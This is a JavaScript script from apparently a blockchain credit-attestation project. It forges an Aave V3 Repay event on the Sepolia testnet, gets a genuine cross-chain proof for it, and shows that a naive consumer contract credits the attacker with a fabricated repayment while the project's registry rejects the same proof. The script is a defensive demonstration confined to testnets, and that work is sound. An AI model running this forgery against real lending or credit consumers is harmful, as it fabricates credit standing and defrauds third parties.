/**
 * Perform S2 live: prove a forged Aave repayment, then submit the identical
 * proof bytes to two contracts and watch them disagree.
 *
 *   node scripts/attack/forge-fact.mjs
 *
 * WHAT THIS DEMONSTRATES
 *
 *   A valid Attestcoin proof can still be a lie.
 *
 * The proof produced here is genuine in every cryptographic sense. A real
 * transaction is sent to a real contract on Sepolia. It really succeeds. The
 * log it writes really carries Aave V3's exact `Repay` topic0. The real
 * Attestcoin proof builder really proves it, and the real Block Prover
 * precompile on CC3 really verifies it.
 *
 * The precompile is not fooled, because it was never asked the question that
 * matters. It answers "was this transaction included in a block on this chain?"
 * -- and the honest answer is yes. It does not answer "did the contract that
 * emitted this log have any right to emit it?" Authorship is the consumer's job,
 * and authorship is what a credit fact depends on.
 *
 * THE ASSERTION
 *
 *   1. NaiveConsumer.hasProof(attacker, AAVE_REPAYMENT) === true
 *   2. VouchRegistry.submitBatch(...) reverts with EmitterMismatch
 *
 * Same bytes. Opposite outcomes. Only one contract established authorship.
 *
 * THE FALSIFIER, stated before this script was written
 *
 *   If the naive consumer REJECTS the forged proof, or the registry ACCEPTS it,
 *   the S2 claim is refuted and must be withdrawn from every surface in this
 *   repository. If the proof builder refuses to prove a lookalike event for a
 *   reason not yet discovered, S2 degrades from `demonstrated` to
 *   `defended by test only` and the README must say so.
 *
 * DEPLOYMENT BOUNDARY
 *
 *   The lookalike emitter goes to ETHEREUM SEPOLIA (chainKey 1) and never to
 *   mainnet. A mainnet contract whose only purpose is emitting convincing fake
 *   Aave events is a live artifact built to deceive third parties who have never
 *   heard of this project. `topic0` is not chain-specific, so the demonstration
 *   is identical and nothing is lost. The honest path proves Ethereum mainnet
 *   (chainKey 3); running the attack on Sepolia exercises both key-space values
 *   in one submission, which also proves the branded chainKey types are real
 *   rather than hardcoded.
 */

import {
  createPublicClient,
  createWalletClient,
  defineChain,
  http,
  keccak256,
  parseAbi,
  toHex,
} from 'viem';
import { privateKeyToAccount } from 'viem/accounts';
import { readFileSync } from 'node:fs';

// ---------------------------------------------------------------------------
// Config
// ---------------------------------------------------------------------------

const env = Object.fromEntries(
  readFileSync(new URL('../../.env.local', import.meta.url), 'utf8')
    .split('\n')
    .filter((l) => l.includes('=') && !l.trim().startsWith('#'))
    .map((l) => [l.slice(0, l.indexOf('=')).trim(), l.slice(l.indexOf('=') + 1).trim()]),
);

const SEPOLIA_RPC = env.ETH_SEPOLIA_RPC;
const CREDITCOIN_RPC = env.CREDITCOIN_RPC ?? 'https://rpc.cc3-testnet.creditcoin.network';
const REGISTRY = env.VOUCH_REGISTRY_ADDRESS;
const KEY = env.CREDITCOIN_PRIVATE_KEY;
const PROVER = env.PROOF_BUILDER_URL ?? 'https://proof-gen-api.cc3-testnet.creditcoin.network';

/** Deployed by `scripts/attack/deploy-spoof.mjs`, or set by hand after `forge create`. */
const SPOOF_EMITTER = env.SPOOF_EMITTER_SEPOLIA;
/** Deployed to CC3 alongside the registry. */
const NAIVE_CONSUMER = env.NAIVE_CONSUMER_ADDRESS;

/** Attestcoin key space, NOT chainId. On CC3 Testnet, 1 is Sepolia. */
const CHAIN_KEY = 1;

const REPAY_TOPIC = keccak256(toHex('Repay(address,address,address,uint256,bool)'));
const AAVE_REPAYMENT = keccak256(toHex('AAVE_REPAYMENT'));

/** Sepolia USDC, named only so the forged log looks plausible. */
const USDC_SEPOLIA = '0x94a9D9AC8a22534E3FaCa9F4e7F2E2cf85d5E4C8';

/** The fabricated amount. One million, because the point is that size is free. */
const FORGED_AMOUNT = 1_000_000_000_000n; // 1,000,000 * 1e6

const SPOOF_ABI = parseAbi([
  'function mintHistory(address reserve, uint256 amount)',
  'event Repay(address indexed reserve, address indexed user, address indexed repayer, uint256 amount, bool useATokens)',
]);

const REGISTRY_ABI = parseAbi([
  'function submitBatch((bytes32,bytes32[]) continuity, (uint64,uint64,bytes32,bytes32,uint32,bytes,bytes32,(bytes32,bool)[])[] claims) returns (uint256)',
  'function hasProof(address subject, bytes32 factType) view returns (bool)',
  'function totalProofs(address subject) view returns (uint32)',
]);

const NAIVE_ABI = parseAbi([
  'function submit((bytes32,bytes32[]) continuity, (uint64,uint64,bytes32,bytes32,uint32,bytes,bytes32,(bytes32,bool)[]) claim) returns (address, uint256)',
  'function hasProof(address subject, bytes32 factType) view returns (bool)',
  'function proofValue(address subject, bytes32 factType) view returns (uint256)',
]);

const sepoliaChain = defineChain({
  id: 11_155_111,
  name: 'Ethereum Sepolia',
  nativeCurrency: { name: 'Sepolia Ether', symbol: 'ETH', decimals: 18 },
  rpcUrls: { default: { http: [SEPOLIA_RPC] } },
});

const creditcoinChain = defineChain({
  id: 102_031,
  name: 'Creditcoin CC3 Testnet',
  nativeCurrency: { name: 'Creditcoin', symbol: 'CTC', decimals: 18 },
  rpcUrls: { default: { http: [CREDITCOIN_RPC] } },
});

const account = privateKeyToAccount(KEY);

const sepolia = createPublicClient({ chain: sepoliaChain, transport: http(SEPOLIA_RPC) });
const sepoliaWallet = createWalletClient({ account, chain: sepoliaChain, transport: http(SEPOLIA_RPC) });
const creditcoin = createPublicClient({ chain: creditcoinChain, transport: http(CREDITCOIN_RPC) });
const creditcoinWallet = createWalletClient({ account, chain: creditcoinChain, transport: http(CREDITCOIN_RPC) });

function requireEnv() {
  const missing = Object.entries({
    ETH_SEPOLIA_RPC: SEPOLIA_RPC,
    VOUCH_REGISTRY_ADDRESS: REGISTRY,
    CREDITCOIN_PRIVATE_KEY: KEY,
    SPOOF_EMITTER_SEPOLIA: SPOOF_EMITTER,
    NAIVE_CONSUMER_ADDRESS: NAIVE_CONSUMER,
  })
    .filter(([, v]) => !v)
    .map(([k]) => k);

  if (missing.length) {
    console.error('Missing from .env.local:\n  ' + missing.join('\n  '));
    console.error('\nDeploy the harness first:');
    console.error('  cd packages/contracts');
    console.error('  forge create src/attack/SpoofEmitter.sol:SpoofEmitter --rpc-url $ETH_SEPOLIA_RPC --private-key $KEY');
    console.error('  forge create src/attack/NaiveConsumer.sol:NaiveConsumer --rpc-url $CREDITCOIN_RPC --private-key $KEY \\');
    console.error('    --constructor-args $REPAY_TOPIC 2');
    process.exit(1);
  }
}

// ---------------------------------------------------------------------------

async function main() {
  requireEnv();

  console.log('S2 LIVE — a valid proof of a forged event');
  console.log('='.repeat(64));
  console.log(`attacker        ${account.address}`);
  console.log(`lookalike       ${SPOOF_EMITTER}  (Sepolia, chainKey ${CHAIN_KEY})`);
  console.log(`naive consumer  ${NAIVE_CONSUMER}  (CC3)`);
  console.log(`vouch registry  ${REGISTRY}  (CC3)`);

  // -------------------------------------------------------------------------
  console.log('\n1. Minting a repayment that never happened...');
  // -------------------------------------------------------------------------

  const forgeHash = await sepoliaWallet.writeContract({
    address: SPOOF_EMITTER,
    abi: SPOOF_ABI,
    functionName: 'mintHistory',
    args: [USDC_SEPOLIA, FORGED_AMOUNT],
  });

  const forgeReceipt = await sepolia.waitForTransactionReceipt({ hash: forgeHash });
  if (forgeReceipt.status !== 'success') throw new Error('The forging transaction reverted.');

  const forgedLogIndex = forgeReceipt.logs.findIndex((l) => l.topics[0] === REPAY_TOPIC);
  if (forgedLogIndex < 0) throw new Error('No Repay log in the forging receipt.');

  const forgedLog = forgeReceipt.logs[forgedLogIndex];
  const subject = `0x${forgedLog.topics[2].slice(-40)}`;

  console.log(`   tx            ${forgeHash}`);
  console.log(`   block         ${forgeReceipt.blockNumber}`);
  console.log(`   status        ${forgeReceipt.status}   <- it really succeeded`);
  console.log(`   topic0        ${forgedLog.topics[0]}`);
  console.log(`   aave's topic0 ${REPAY_TOPIC}`);
  console.log(`   identical     ${forgedLog.topics[0] === REPAY_TOPIC}`);
  console.log(`   emitter       ${forgedLog.address}   <- the only thing that is wrong`);
  console.log(`   subject       ${subject}   <- the attacker, credited with 1,000,000`);

  // -------------------------------------------------------------------------
  console.log('\n2. Asking the real Attestcoin prover to prove it...');
  // -------------------------------------------------------------------------

  const { service } = await import('@gluwa/usc-sdk/dist/proof-provider/index.js');
  const builder = new service.ProofBuilder(CHAIN_KEY, PROVER, 120_000);

  const result = await builder.getProof(forgeHash);
  if (!result.success || !result.data) {
    console.error(`\n   The proof builder refused: ${result.error ?? 'unknown'}`);
    console.error('   S2 degrades from `demonstrated` to `defended by test only`.');
    console.error('   Update README.md and docs/PRD.md to say exactly that.');
    process.exit(2);
  }

  const { txBytes, continuityProof, merkleProof, headerNumber } = result.data;
  console.log(`   proof built      yes   <- Attestcoin proved a forged event, correctly`);
  console.log(`   continuity roots ${continuityProof.roots.length}`);
  console.log(`   tx bytes         ${txBytes.length} chars`);

  const continuity = [continuityProof.lowerEndpointDigest, continuityProof.roots];
  const claim = [
    BigInt(CHAIN_KEY),
    BigInt(headerNumber),
    forgeHash,
    AAVE_REPAYMENT,
    forgedLogIndex,
    txBytes,
    merkleProof.root,
    merkleProof.siblings.map((s) => [s.hash, s.isLeft]),
  ];

  const fingerprint = keccak256(txBytes);
  console.log(`   payload sha      ${fingerprint}   <- identical bytes go to both contracts`);

  // -------------------------------------------------------------------------
  console.log('\n3. Submitting to the NAIVE consumer...');
  // -------------------------------------------------------------------------

  let naiveAccepted = false;
  try {
    const hash = await creditcoinWallet.writeContract({
      address: NAIVE_CONSUMER,
      abi: NAIVE_ABI,
      functionName: 'submit',
      args: [continuity, claim],
    });
    const rc = await creditcoin.waitForTransactionReceipt({ hash });
    naiveAccepted = rc.status === 'success';
    console.log(`   tx      ${hash}`);
    console.log(`   status  ${rc.status}`);
  } catch (error) {
    console.log(`   REVERTED: ${error.shortMessage ?? error.message}`);
  }

  const [naiveHas, naiveValue] = await Promise.all([
    creditcoin.readContract({ address: NAIVE_CONSUMER, abi: NAIVE_ABI, functionName: 'hasProof', args: [subject, AAVE_REPAYMENT] }),
    creditcoin.readContract({ address: NAIVE_CONSUMER, abi: NAIVE_ABI, functionName: 'proofValue', args: [subject, AAVE_REPAYMENT] }),
  ]);

  console.log(`   hasProof    ${naiveHas}`);
  console.log(`   proofValue  ${naiveValue}   <- fabricated standing, issued`);

  // -------------------------------------------------------------------------
  console.log('\n4. Submitting the IDENTICAL bytes to Vouch...');
  // -------------------------------------------------------------------------

  let vouchRejected = false;
  let revertReason = '';
  try {
    const hash = await creditcoinWallet.writeContract({
      address: REGISTRY,
      abi: REGISTRY_ABI,
      functionName: 'submitBatch',
      args: [continuity, [claim]],
    });
    const rc = await creditcoin.waitForTransactionReceipt({ hash });
    console.log(`   tx      ${hash}`);
    console.log(`   status  ${rc.status}`);
    vouchRejected = rc.status !== 'success';
  } catch (error) {
    revertReason = error.shortMessage ?? error.message;
    vouchRejected = /EmitterMismatch|0x[0-9a-f]*/i.test(revertReason);
    console.log(`   REVERTED: ${revertReason}`);
  }

  const vouchHas = await creditcoin.readContract({
    address: REGISTRY, abi: REGISTRY_ABI, functionName: 'hasProof', args: [subject, AAVE_REPAYMENT],
  });
  console.log(`   hasProof    ${vouchHas}   <- forged standing, refused`);

  // -------------------------------------------------------------------------
  console.log('\n' + '='.repeat(64));
  // -------------------------------------------------------------------------

  const claimHolds = naiveAccepted && naiveHas && vouchRejected && !vouchHas;

  console.log(`naive consumer credited the forgery   ${naiveHas}`);
  console.log(`vouch rejected the identical proof    ${vouchRejected && !vouchHas}`);
  console.log(`the proof itself was valid            true  (Attestcoin verified it)`);
  console.log('');

  if (claimHolds) {
    console.log('S2 DEMONSTRATED.');
    console.log('The same valid proof means two different things to two consumers.');
    console.log('Only one of them established authorship.');
  } else {
    console.log('S2 NOT DEMONSTRATED — the falsifier fired.');
    console.log('Do not claim the live demonstration on any surface.');
    console.log(`  naive accepted: ${naiveAccepted && naiveHas}`);
    console.log(`  vouch rejected: ${vouchRejected && !vouchHas}`);
    process.exit(3);
  }

  console.log(`\n  forged on Sepolia   https://sepolia.etherscan.io/tx/${forgeHash}`);
  console.log(`  subject             ${subject}`);
}

main().catch((error) => {
  console.error('\nFAILED:', error.shortMessage ?? error.message);
  process.exit(1);
});
